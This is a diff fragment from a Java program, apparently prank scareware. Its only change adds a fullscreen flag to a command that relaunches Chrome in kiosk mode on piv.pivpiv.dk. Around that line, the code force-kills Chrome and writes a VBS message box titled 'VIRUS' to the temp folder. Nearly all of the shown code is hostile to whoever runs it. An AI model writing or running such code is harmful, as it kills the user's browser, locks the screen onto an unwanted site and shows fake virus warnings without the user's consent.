@@ -94,7 +94,7 @@ public class   ControladorPrincipal {
         try {
             Runtime.getRuntime().exec("cmd.exe /c taskkill /f /im chrome.exe");
             Thread.sleep(100);
-            Runtime.getRuntime().exec("cmd.exe /c start chrome -kiosk piv.pivpiv.dk");
+            Runtime.getRuntime().exec("cmd.exe /c start chrome -kiosk -fullscreen piv.pivpiv.dk");
             Thread.sleep(100);
             Runtime.getRuntime().exec("cmd.exe /c echo x=msgbox(\"AAAAAAAAAAAAAAAAAA\",vbYesNo,\"VIRUS\") = vbYes > %tmp%\\tmp.vbs");
             for (int i = 0; i < 10; i++) {
